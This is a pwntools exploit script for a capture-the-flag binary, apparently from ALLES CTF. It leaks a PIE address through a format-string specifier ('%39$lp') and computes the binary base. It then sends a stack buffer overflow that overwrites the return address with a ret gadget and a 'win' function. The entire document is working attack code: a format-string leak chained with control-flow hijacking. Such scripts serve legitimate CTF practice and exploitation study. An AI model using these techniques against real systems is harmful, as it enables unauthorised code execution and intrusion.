from pwn import *

#calculate libc base fiirst %p - 0x1eb723
#libc_offset = 0x1eb72
pie_offset = 0xb21
win_offset = 0x9ec
ret_offset = 0xaf3

leak = "AAAA %39$lp BBBB"
spell = "Expelliarmus\x00"
pad = cyclic(0xff+0xf)

#p = remote("hax1.allesctf.net",9100)
p = process("./pwn1")

print(p.recvline())
p.sendline(leak)
tmp = p.recvuntil("spell:")
print(tmp)

pie_addr = tmp.split()[-6]
print(pie_addr)

pie_base = int(pie_addr,16)-pie_offset
win_fun = pie_base+win_offset
print("[*] PIE base addr: {}".format(hex(pie_base)))
print("[*] WINgardium addr: {}".format(hex(win_fun)))

ret = pie_base + ret_offset

raw_input("Exploit ?")
idx = cyclic_find("cnaacoaa")

p.sendline(spell+pad[:idx]+p64(ret)+p64(win_fun))
p.interactive()
